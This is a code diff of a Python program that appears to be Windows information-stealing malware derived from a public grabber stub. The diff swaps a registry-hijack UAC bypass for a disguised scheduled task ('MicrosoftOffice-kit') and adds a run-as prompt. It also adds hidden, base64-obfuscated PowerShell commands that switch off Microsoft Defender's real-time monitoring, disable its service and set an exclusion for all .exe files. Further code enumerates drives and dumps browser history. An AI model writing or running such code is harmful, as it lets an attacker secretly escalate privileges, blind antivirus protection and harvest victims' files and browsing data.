@@ -57,26 +57,40 @@ def adm() -> bool:
     except:
         return False
 
-# from https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Components/stub.py (TEMPORARY) (EDITED) (DETECTED ASF)
+
 if not adm():
-    execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
-    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
-    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-    execute("computerdefaults --nouacbypass")
-    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
-    execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
-    execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
-    execute("fodhelper --nouacbypass")
-    execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
+    task_name = 'MicrosoftOffice-kit'
+    script_path = os.path.abspath(sys.executable)
+    command = f'powershell.exe -Command "schtasks /create /tn {task_name} /tr \\"{script_path}\\" /sc once /rl highest /st 00:00 /f"'
+    subprocess.run(command, shell=True)
+    start_task_command = f'powershell.exe -Command "schtasks /run /tn {task_name}"'
+    subprocess.run(start_task_command, shell=True)
+    subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
+# IF UAC BYPASS FAILED ASK FOR ADMIN
+if not adm():    
+    ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, __file__, None, 1)
+    sys.exit()
 
+# DEFENDER DISABLE
+# SHELL
+command = base64.b64decode(b'U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ==').decode(errors= 'ignore')
+subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
+command = base64.b64decode(b'c2MuZXhlIGNvbmZpZyAiV2luRGVmZW5kIiBzdGFydD0gZGlzYWJsZWQ=').decode(errors= 'ignore')
+subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
-# from https://github.com/Blank-c/Blank-Grabber/blob/main/Blank%20Grabber/Components/stub.py (TEMPORARY)
-command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
-subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+# REGISTRY
+command = base64.b64decode(b'U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC1OYW1lICJEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIiAtVmFsdWUgMSAtRm9yY2U=').decode(errors= 'ignore')
+subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
-subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(sys.executable), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+command = base64.b64decode(b'U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC1OYW1lICJEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIiAtVmFsdWUgMSAtRm9yY2U=').decode(errors= 'ignore')
+subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+
+# EXCLUSION
+# SHELL
+command = base64.b64decode(b'QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uRXh0ZW5zaW9uICIuZXhlIg==').decode(errors= 'ignore')
+subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 
 
 
@@ -127,22 +141,27 @@ class utils:
             size /= 1024
 
     def generate_tree(path) -> str:
-        tree = '📂 - PC\n'
+        tree = f'📂 - PC ({path})\n'
         for root, dirs, files in os.walk(path):
             level = root.replace(path, '').count(os.sep)
-            indent = ' ' * 4 * (level)
-            tree += f'{indent}├── 📂 - {os.path.basename(root)}\n'
-            subindent = ' ' * 4 * (level + 1)
-            for file in files:
+            indent = '    ' * level
+            if level > 0:
+                tree += f'{indent}└── 📂 - {os.path.basename(root)}\n'
+            subindent = '    ' * (level + 1)
+            for i, file in enumerate(files):
                 file_path = os.path.join(root, file)
                 size = os.path.getsize(file_path)
-                formatted_size = utils.format_size(size)
-                tree += f'{subindent}├── 📄 - {file} ({formatted_size})\n'
-        
+                formatted_size = utils.format_size(size)  # Assuming you have a function to format size
+                if i == len(files) - 1:
+                    tree += f'{subindent}└── 📄 - {file} ({formatted_size})\n'
+                else:
+                    tree += f'{subindent}├── 📄 - {file} ({formatted_size})\n'
+            
         return tree
 
     def search_disks_for_folder(folder_name: str) -> str:
-        for drive in ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']:
+        drives = [f'{chr(letter)}:\\' for letter in range(ord('A'), ord('Z') + 1)]
+        for drive in drives:
             folder_path = os.path.join(drive, folder_name)
             
             if os.path.exists(folder_path):
@@ -503,6 +522,7 @@ class getinfo:
                             last_visit_width = 30
 
                             output = open(output_path, 'w', encoding='utf-8')
+                            output.write(f'{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}')
                             output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
                             output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
                             for row in rows:
@@ -580,16 +600,18 @@ class getinfo:
                         title_width = 100
                         last_visit_width = 30
 
-                        with open(output_path, 'w', encoding='utf-8') as output:
-                            output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
-                            output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
-                            for row in rows:
-                                url = self.remove_url_params(row[0])
-                                title = row[1] if row[1] else 'No Title'
-                                visit_time = self.convert_time(row[2] // 1000000)
-                                output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
+                        output = open(output_path, 'w', encoding='utf-8')
+                        output.write(f'{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}')
+                        output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
+                        output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
+                        for row in rows:
+                            url = self.remove_url_params(row[0])
+                            title = row[1] if row[1] else 'No Title'
+                            visit_time = self.convert_time(row[2] // 1000000)
+                            output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
 
                         conn.close()
+                        output.close()
                     except:
                         pass
 
